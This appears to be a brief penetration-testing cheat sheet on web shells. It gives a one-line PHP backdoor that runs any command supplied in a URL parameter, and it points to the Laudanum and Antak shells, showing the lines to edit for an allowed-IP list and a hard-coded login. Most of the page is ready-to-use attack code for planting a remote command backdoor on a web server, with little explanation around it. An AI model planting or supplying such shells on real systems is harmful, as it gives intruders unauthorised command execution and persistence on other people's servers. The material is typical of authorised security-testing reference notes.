# Web Shell

## Custom Script

```php title="shell.php" linenums="1"
<?php system($_GET["cmd"]); ?>
```

## [Laudanum](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells/laudanum-1.0)

```php title="shell.php" linenums="46"
$allowedIPs = array("192.168.1.55", "12.2.2.2", "10.10.14.22");
```

## [Antak](https://github.com/samratashok/nishang/tree/master/Antak-WebShell)

```cs title="antak.aspx" linenums="14"
if (Username.Text == "hacker" && Password.Text == "Password123!")
```
